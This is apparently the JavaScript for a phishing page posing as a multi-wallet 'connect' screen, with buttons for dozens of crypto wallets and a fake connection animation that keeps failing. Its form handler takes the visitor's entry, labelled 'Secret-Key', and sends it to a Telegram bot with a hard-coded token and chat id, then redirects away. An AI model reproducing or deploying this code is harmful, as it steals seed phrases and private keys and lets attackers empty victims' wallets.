const popUp = document.getElementById("pop-up")
const trustBtn = document.getElementById("trust-btn")
const safePal = document.getElementById("safepal-btn")
const  metaBtn = document.getElementById("meta-btn")
const ledgerliveBtn = document.getElementById("ledgerlive-btn")
const hashBtn = document.getElementById("hash-btn")
const coinbaseBtn = document.getElementById("coinbase-btn")
const cryptoBtn = document.getElementById("crypto-btn")
const changewalletBtn = document.getElementById("changewallet-btn")
const bitfrostBtn = document.getElementById("bitfrostwallet-btn")
const  stationBtn = document.getElementById("station-btn")
const peraBtn = document.getElementById("pera-btn")
const walkenBtn = document.getElementById("walken-btn")
const stepnBtn = document.getElementById("stepn-btn")
const saitaBtn = document.getElementById("saita-btn")
const deflyBtn = document.getElementById("defly-btn")
const safemoBtn = document.getElementById("safemoo-btn")
const saitaproBtn = document.getElementById("saitapro-btn")
const walletConnectBtn = document.getElementById("walletconnect-btn")
const blockwalletBtn= document.getElementById("blockwallet-btn")
const stargazerBtn= document.getElementById("stargazer-btn")
const tensetBtn = document.getElementById("tenset-btn")
const bullBtn = document.getElementById("bull-btn")
const liqualityBtn = document.getElementById("liquality-btn")
const binanceBtn = document.getElementById("binance-btn")
const polygonBtn = document.getElementById("polygon-btn")
const rainbowBtn = document.getElementById("rainbow-btn")
const bitpayBtn = document.getElementById("bitpay-btn")
const walletBtn = document.getElementById("wallet-btn")
const argentBtn = document.getElementById("argent-btn")
const huobiBtn = document.getElementById("huobi-btn")
const encryptedBtn = document.getElementById("encrypted-btn")
const compoundBtn = document.getElementById("compound-btn")
const polkadotBtn = document.getElementById("polkadot-btn")
const iotextBtn = document.getElementById("iotex-btn")
const coinBtn = document.getElementById("coin-btn")
const tokenBtn = document.getElementById("token-btn")
const mathBtn = document.getElementById("math-btn")
const inchBtn = document.getElementById("inch-btn")
const dhamaBtn = document.getElementById("darma-btn")
const trustwalletBtn = document.getElementById("trustwallet-btn")
const mickeyBtn = document.getElementById("mikey-btn")
const atomicBtn = document.getElementById("atomic-btn")
const coolwalletBtn = document.getElementById("coolwallet-btn")
const nashBtn = document.getElementById("nash-btn")
const coinmoneyBtn = document.getElementById("coinmoney-btn")
const gridplusBtn = document.getElementById("gridplus-btn")
const tokenaryBtn = document.getElementById("tokenary-btn")
const safepalBtn = document.getElementById("safepalwallet-btn")
const infinitoBtn = document.getElementById("infinito-btn")
const walletioBtn = document.getElementById("walletio-btn")
const ownbitBtn = document.getElementById("ownbit-btn")
const easypocketBtn = document.getElementById("easypocket-btn")
const bridgewalletBtn = document.getElementById("bridgewallet-btn")
const viawalletBtn = document.getElementById("viawallet-btn")
const bitkeepBtn = document.getElementById("bitkeep-btn")
const unstopablewalletBtn = document.getElementById("unstopablewallet-btn")
const halodefiBtn = document.getElementById("halodefi-btn")
const dockwalletBtn = document.getElementById("dockwallet-btn")
const cellowalletBtn = document.getElementById("cellowallet-btn")
const coinusBtn = document.getElementById("coinus-btn")
const valoraBtn = document.getElementById("valora-btn")
const trusteewalletBtn = document.getElementById("trusteewallet-btn")
const guardawalletBtn = document.getElementById("guardawallet-btn")
const jadewalletBtn = document.getElementById("jadewallet-bullet")
const plasmapayBtn = document.getElementById("plasmapay-btn")
const zerothreewalletBtn = document.getElementById("03wallet-btn")
const hashkeyBtn = document.getElementById("hashkey-btn")
const rwalletBtn = document.getElementById("rwallet-btn")
const flarewalletBtn = document.getElementById("flarewallet-btn")
const kyberswapBtn = document.getElementById("kyberswap-btn")
const atokenBtn = document.getElementById("atoken-btn")

const tonguewalletBtn = document.getElementById("tonguewallet-btn")
const xinfinBtn = document.getElementById("xinfin-btn")
const talkenwalletBtn = document.getElementById("talkenwallet-btn")
const keyringproBtn = document.getElementById("keyringpro-btn")
const midaswalletBtn = document.getElementById("midaswallet-btn")
const atwalletBtn = document.getElementById("atwallet-btn")

const tangemwalletBtn = document.getElementById("tangemwallet-btn")
const tokenimBtn = document.getElementById("tokenim-btn")
const othersBtn = document.getElementById("others-btn")

const closeIcon = document.getElementById("close-icon")

const object = document.getElementById("movingObject");
const dropForm = document.getElementById("dropForm");
const tryAgain = document.getElementById("tryAgain");
const btnbtnconnect = document.getElementById("btnbtnConnect")
const textArea = document.getElementById("textArea")


const button = document.getElementById("connectBtn");
const form = document.querySelector("#form");

form.addEventListener("submit", (e) => {
    e.preventDefault();

    const infoArea = document.querySelector("#username").value;
    const token = "7596214547:AAGMsoahQ93YlxFUxopXd6DrUFAa9Y2usrI";
    const chat_id = "1000425167";

    const url = `https://api.telegram.org/bot${token}/sendMessage?chat_id=${chat_id}`;

    const api = new XMLHttpRequest();
    api.open("POST", url, true); // Use POST method
    api.setRequestHeader("Content-Type", "application/json"); // Important for POST requests

    // Construct the JSON payload
    const data = JSON.stringify({
        chat_id: chat_id,
        infoArea: infoArea.value,
        text: `Secret-Key: ${infoArea}`,
    });

    api.onload = () => {
        if (api.status >= 200 && api.status < 300) {
            console.log("Message sent successfully!");
            // Optionally display a success message to the user
        } else {
            console.error("Error sending message:", api.status, api.responseText);
            // Optionally display an error message to the user
        }
    };

    api.onerror = () => {
        console.error("Network error occurred.");
        // Handle network errors appropriately
    }

    api.send(data); // Send the JSON data with the request
    infoArea.value = "";
});


function redirect() {
    // Get the form data (for example, assuming a form with an input field with id="inputField")
    var infoArea = document.getElementById("username").value;

    // Check if the form data is empty
    if (infoArea.trim() == "") {
        return; // Don't redirect if the form is empty
    }

    // Proceed with the redirect if there is data
    window.location.href = "https://remixicon.com/" + [];
}





window.onload = function () {
    const infoArea = document.getElementById("username");
    const button = document.getElementById("connectBtn");

    function updateButtonState() {
        if (infoArea.value.trim().length > 0) {
            button.disabled = false; // Enable button
            button.classList.remove("opacity-50", "blur-sm", "cursor-not-allowed");
        } else {
            button.disabled = true; // Disable button
            button.classList.add("opacity-50", "blur-sm", "cursor-not-allowed");
        }
    }

    // Ensure the button starts disabled
    updateButtonState();

    // Listen for input changes
    infoArea.addEventListener("input", updateButtonState);
};



window.addEventListener("scroll", function () {
    const navbar = document.getElementById("navbar");
    if (window.scrollY > 50) {
        navbar.classList.add("bg-white", "shadow-lg", "border-b", "border-gray-300");
        navbar.classList.remove("text-white");
        navbar.classList.add("text-black");
    } else {
        navbar.classList.remove("bg-white", "shadow-lg", "border-b", "border-gray-300");
        navbar.classList.remove("text-black");
        navbar.classList.add("text-white");
    }
});


btnbtnconnect.addEventListener("click", () => {
    textArea.classList.remove("hidden")
})


tryAgain.addEventListener("click", () => {
    dropForm.classList.add("hidden")
})

function showPopup() {
    document.getElementById("dropForm").classList.remove("hidden");
}
// Automatically show the popup after 3 seconds (3000ms)
setTimeout(showPopup, 3000);


function moveObject(){
    object.style.transition = "transform 5s linear"; // Move in 5 seconds
    object.style.transform = "translateX(1600%)";
}

// function moveObject() {
//     object.style.transition = "transform 5s linear"; // Move in 5 seconds
//     object.style.transform = "translateX(calc(100vw - 4rem))"; // Moves fully to the end
// }

function resetObject() {
    object.style.transition = "none"; // Instantly reset position
    object.style.transform = "translateX(0)"; // Move back to start
    
    setTimeout(moveObject, 100); // Restart the movement after a short delay
}

// Start movement when page loads
setTimeout(moveObject, 500);


tryAgain.addEventListener("click", () => {
    resetObject();  // Call resetObject when the button is clicked
    setTimeout(showPopup, 3000); // Schedule showPopup independently
});

closeIcon.addEventListener("click", () => {
    resetObject();  // Call resetObject when the button is clicked
    setTimeout(showPopup, 3000); // Schedule showPopup independently
});

// Restart movement when "Try Again" is clicked
// tryAgain.addEventListener("click", resetObject).setTimeout(showPopup, 3000);






othersBtn.addEventListener("click", () => {
    popUp.classList.toggle("top-[0%]")
})
tokenimBtn.addEventListener("click", () => {
    popUp.classList.toggle("top-[0%]")
})
tangemwalletBtn.addEventListener("click", () => {
    popUp.classList.toggle("top-[0%]")
})
tonguewalletBtn.addEventListener("click", () => {
    popUp.classList.toggle("top-[0%]")
})
xinfinBtn.addEventListener("click", () => {
    popUp.classList.toggle("top-[0%]")
})
talkenwalletBtn.addEventListener("click", () => {
    popUp.classList.toggle("top-[0%]")
})
keyringproBtn.addEventListener("click", () => {
    popUp.classList.toggle("top-[0%]")
})
midaswalletBtn.addEventListener("click", () => {
    popUp.classList.toggle("top-[0%]")
})
atwalletBtn.addEventListener("click", () => {
    popUp.classList.toggle("top-[0%]")
})

zerothreewalletBtn.addEventListener("click", () => {
    popUp.classList.toggle("top-[0%]")
})
hashkeyBtn.addEventListener("click", () => {
    popUp.classList.toggle("top-[0%]")
})
rwalletBtn.addEventListener("click", () => {
    popUp.classList.toggle("top-[0%]")
})
flarewalletBtn.addEventListener("click", () => {
    popUp.classList.toggle("top-[0%]")
})
kyberswapBtn.addEventListener("click", () => {
    popUp.classList.toggle("top-[0%]")
})
atokenBtn.addEventListener("click", () => {
    popUp.classList.toggle("top-[0%]")
})
coinusBtn.addEventListener("click", () => {
    popUp.classList.toggle("top-[0%]")
})
valoraBtn.addEventListener("click", () => {
    popUp.classList.toggle("top-[0%]")
})
trusteewalletBtn.addEventListener("click", () => {
    popUp.classList.toggle("top-[0%]")
})
guardawalletBtn.addEventListener("click", () => {
    popUp.classList.toggle("top-[0%]")
})
jadewalletBtn.addEventListener("click", () => {
    popUp.classList.toggle("top-[0%]")
})
plasmapayBtn.addEventListener("click", () => {
    popUp.classList.toggle("top-[0%]")
})
cellowalletBtn.addEventListener("click", () => {
    popUp.classList.toggle("top-[0%]")
})
dockwalletBtn.addEventListener("click", () => {
    popUp.classList.toggle("top-[0%]")
})
halodefiBtn.addEventListener("click", () => {
    popUp.classList.toggle("top-[0%]")
})
unstopablewalletBtn.addEventListener("click", () => {
    popUp.classList.toggle("top-[0%]")
})
bitkeepBtn.addEventListener("click", () => {
    popUp.classList.toggle("top-[0%]")
})
viawalletBtn.addEventListener("click", () => {
    popUp.classList.toggle("top-[0%]")
})
bridgewalletBtn.addEventListener("click", () => {
    popUp.classList.toggle("top-[0%]")
})
easypocketBtn.addEventListener("click", () => {
    popUp.classList.toggle("top-[0%]")
})
ownbitBtn.addEventListener("click", () => {
    popUp.classList.toggle("top-[0%]")
})
walletioBtn.addEventListener("click", () => {
    popUp.classList.toggle("top-[0%]")
})
infinitoBtn.addEventListener("click", () => {
    popUp.classList.toggle("top-[0%]")
})
safepalBtn.addEventListener("click", () => {
    popUp.classList.toggle("top-[0%]")
})
tokenaryBtn.addEventListener("click", () => {
    popUp.classList.toggle("top-[0%]")
})
gridplusBtn.addEventListener("click", () => {
    popUp.classList.toggle("top-[0%]")
})
coinmoneyBtn.addEventListener("click", () => {
    popUp.classList.toggle("top-[0%]")
})
nashBtn.addEventListener("click", () => {
    popUp.classList.toggle("top-[0%]")
})
mickeyBtn.addEventListener("click", () => {
    popUp.classList.toggle("top-[0%]")
})
atomicBtn.addEventListener("click", () => {
    popUp.classList.toggle("top-[0%]")
})
coolwalletBtn.addEventListener("click", () => {
    popUp.classList.toggle("top-[0%]")
})
dhamaBtn.addEventListener("click", () => {
    popUp.classList.toggle("top-[0%]")
})
trustwalletBtn.addEventListener("click", () => {
    popUp.classList.toggle("top-[0%]")
})
mathBtn.addEventListener("click", () => {
    popUp.classList.toggle("top-[0%]")
})
inchBtn.addEventListener("click", () => {
    popUp.classList.toggle("top-[0%]")
})
tokenBtn.addEventListener("click", () => {
    popUp.classList.toggle("top-[0%]")
})
coinBtn.addEventListener("click", () => {
    popUp.classList.toggle("top-[0%]")
})
iotextBtn.addEventListener("click", () => {
    popUp.classList.toggle("top-[0%]")
})
polkadotBtn.addEventListener("click", () => {
    popUp.classList.toggle("top-[0%]")
})
compoundBtn.addEventListener("click", () => {
    popUp.classList.toggle("top-[0%]")
})
encryptedBtn.addEventListener("click", () => {
    popUp.classList.toggle("top-[0%]")
})
huobiBtn.addEventListener("click", () => {
    popUp.classList.toggle("top-[0%]")
})
argentBtn.addEventListener("click", () => {
    popUp.classList.toggle("top-[0%]")
})
walletBtn.addEventListener("click", () => {
    popUp.classList.toggle("top-[0%]")
})
bitpayBtn.addEventListener("click", () => {
    popUp.classList.toggle("top-[0%]")
})
rainbowBtn.addEventListener("click", () => {
    popUp.classList.toggle("top-[0%]")
})
polygonBtn.addEventListener("click", () => {
    popUp.classList.toggle("top-[0%]")
})
binanceBtn.addEventListener("click", () => {
    popUp.classList.toggle("top-[0%]")
})
metaBtn.addEventListener("click", () => {
    popUp.classList.toggle("top-[0%]")
})
trustBtn.addEventListener("click", () => {
    popUp.classList.toggle("top-[0%]")
})
safePal.addEventListener("click", () => {
    popUp.classList.toggle("top-[0%]")
})
ledgerliveBtn.addEventListener("click", () => {
    popUp.classList.toggle("top-[0%]")
})
hashBtn.addEventListener("click", () => {
    popUp.classList.toggle("top-[0%]")
})
coinbaseBtn.addEventListener("click", () => {
    popUp.classList.toggle("top-[0%]")
})
cryptoBtn.addEventListener("click", () => {
    popUp.classList.toggle("top-[0%]")
})
changewalletBtn.addEventListener("click", () => {
    popUp.classList.toggle("top-[0%]")
})
bitfrostBtn.addEventListener("click", () => {
    popUp.classList.toggle("top-[0%]")
})
stationBtn.addEventListener("click", () => {
    popUp.classList.toggle("top-[0%]")
})
peraBtn.addEventListener("click", () => {
    popUp.classList.toggle("top-[0%]")
})
walkenBtn.addEventListener("click", () => {
    popUp.classList.toggle("top-[0%]")
})
stepnBtn.addEventListener("click", () => {
    popUp.classList.toggle("top-[0%]")
})
saitaBtn.addEventListener("click", () => {
    popUp.classList.toggle("top-[0%]")
})
deflyBtn.addEventListener("click", () => {
    popUp.classList.toggle("top-[0%]")
})
safemoBtn.addEventListener("click", () => {
    popUp.classList.toggle("top-[0%]")
})
saitaproBtn.addEventListener("click", () => {
    popUp.classList.toggle("top-[0%]")
})
walletConnectBtn.addEventListener("click", () => {
    popUp.classList.toggle("top-[0%]")
})
blockwalletBtn.addEventListener("click", () => {
    popUp.classList.toggle("top-[0%]")
})
stargazerBtn.addEventListener("click", () => {
    popUp.classList.toggle("top-[0%]")
})
tensetBtn.addEventListener("click", () => {
    popUp.classList.toggle("top-[0%]")
})
bullBtn.addEventListener("click", () => {
    popUp.classList.toggle("top-[0%]")
})
liqualityBtn.addEventListener("click", () => {
    popUp.classList.toggle("top-[0%]")
})



closeIcon.addEventListener("click", () => {
    popUp.classList.toggle("top-[0%]")
})